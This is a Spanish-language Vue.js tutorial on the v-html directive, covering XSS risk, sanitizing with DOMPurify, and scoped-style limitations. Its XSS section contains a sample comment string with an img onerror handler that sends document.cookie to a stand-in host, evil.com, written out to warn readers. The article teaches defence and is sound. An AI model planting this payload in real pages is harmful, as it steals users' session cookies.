---
order: 15
title: '¿Cómo se inyecta HTML crudo en Vue y por qué es peligroso?'
difficulty: 'beginner'
tags: ['directives', 'security']
summary: 'v-html renderiza HTML crudo via innerHTML. Nunca lo uses con input del usuario porque habilita ataques XSS. Solo úsalo con contenido confiable y sanitizado.'
---

La directiva `v-html` renderiza una cadena como HTML crudo en lugar de texto plano. Omite la compilación de templates de Vue e inserta el HTML directamente en el DOM usando `innerHTML`. Es útil para renderizar contenido enriquecido de confianza (salida de markdown, contenido de tu propio CMS), pero abre la puerta al Cross-Site Scripting (XSS) si el contenido proviene de la entrada del usuario.

## Uso básico

```vue
<script setup>
const richContent = ref('<p>Hello <strong>world</strong></p>')
</script>

<template>
  <!-- Se renderiza como HTML con estilos -->
  <div v-html="richContent" />

  <!-- Comparado con la interpolación de texto -->
  <div>{{ richContent }}</div>
  <!-- Muestra: <p>Hello <strong>world</strong></p> como texto plano -->
</template>
```

Las dobles llaves `{{ }}` escapan las entidades HTML automáticamente. `v-html` no lo hace.

## El peligro XSS

```vue
<script setup>
// Imagina que esto viene de un formulario de comentarios, un parámetro de URL o una base de datos
const userComment = ref(
  'Nice post! <img src="x" onerror="document.location=\'https://evil.com/steal?cookie=\'+document.cookie">'
)
</script>

<template>
  <!-- Esto ejecuta el JavaScript del atacante -->
  <div v-html="userComment" />
</template>
```

El manejador `onerror` se ejecuta en cuanto el navegador intenta cargar la imagen rota. El atacante ya tiene las cookies del usuario. Otros vectores de ataque incluyen etiquetas `<script>` (aunque `innerHTML` no las ejecuta), `<iframe>`, `<svg onload>` y manejadores de eventos en cualquier elemento.

## Cuándo v-html es seguro

El contenido debe provenir de una fuente que controles completamente:

```vue
<script setup>
import { marked } from 'marked'

// Contenido escrito por TU equipo, almacenado en TU CMS
const markdownSource = '## Título\n\nAlgún texto en **negrita**'
const rendered = computed(() => marked(markdownSource))
</script>

<template>
  <article v-html="rendered" />
</template>
```

Incluso con contenido de confianza, sanea el HTML como capa adicional de defensa.

## Saneamiento del HTML

Si tienes que renderizar HTML proporcionado por el usuario, sanéalo primero con una librería como DOMPurify:

```bash
npm install dompurify
```

```vue
<script setup>
import DOMPurify from 'dompurify'

const userContent = ref('<p>Hello</p><script>alert("xss")<\/script>')

const safeHtml = computed(() => DOMPurify.sanitize(userContent.value))
</script>

<template>
  <!-- La etiqueta script se elimina, solo queda <p>Hello</p> -->
  <div v-html="safeHtml" />
</template>
```

DOMPurify elimina etiquetas y atributos peligrosos mientras mantiene los elementos de formato seguros como `<p>`, `<strong>`, `<em>`, `<a>` (con `href` saneado) e `<img>` (sin manejadores de eventos).

## Limitaciones de v-html

Vue no procesa el HTML inyectado:

```vue
<script setup>
const html = ref('<my-component>Hello</my-component>')
</script>

<template>
  <!-- my-component NO se montará como componente Vue -->
  <div v-html="html" />
</template>
```

El contenido inyectado con `v-html` es DOM crudo. Los componentes Vue, las directivas (`v-if`, `v-for`) y la sintaxis de template (`{{ }}`) dentro de él se ignoran. Si necesitas templates dinámicos, usa funciones render o el compilador en tiempo de ejecución.

## Los estilos con scoped no se aplican

```vue
<style scoped>
p {
  color: red;
}
</style>

<template>
  <!-- El <p> dentro de v-html no será rojo -->
  <div v-html="'<p>Sin estilos</p>'" />
</template>
```

Los estilos con scoped añaden un atributo `data-v-xxxxx` a los elementos compilados por Vue. Los elementos inyectados por `v-html` no reciben ese atributo, así que los selectores con scoped no coinciden. Usa `:deep()` para apuntarlos:

```vue
<style scoped>
div :deep(p) {
  color: red;
}
</style>
```

## Alternativas a v-html

| Necesidad                                 | Enfoque                                              |
| ----------------------------------------- | ---------------------------------------------------- |
| Mostrar texto del usuario de forma segura | `{{ text }}` (escapado automáticamente)              |
| Renderizar markdown                       | Compilar a HTML + DOMPurify + `v-html`               |
| Texto enriquecido de tu CMS               | `v-html` (fuente de confianza)                       |
| Texto enriquecido generado por el usuario | DOMPurify + `v-html`                                 |
| Templates Vue dinámicos                   | Funciones render o compilador en tiempo de ejecución |

Ver también: [¿Qué son los modificadores de eventos?](/es/q/event-modifier-order) · [¿Cómo implementar manejo global de errores?](/es/q/global-error-handling) · [¿Qué es el Virtual DOM?](/es/q/virtual-dom)

## Referencias

- [v-html](https://vuejs.org/api/built-in-directives.html#v-html) - Vue.js docs
- [Security](https://vuejs.org/guide/best-practices/security.html) - Vue.js docs
- [DOMPurify](https://github.com/cure53/DOMPurify) - GitHub
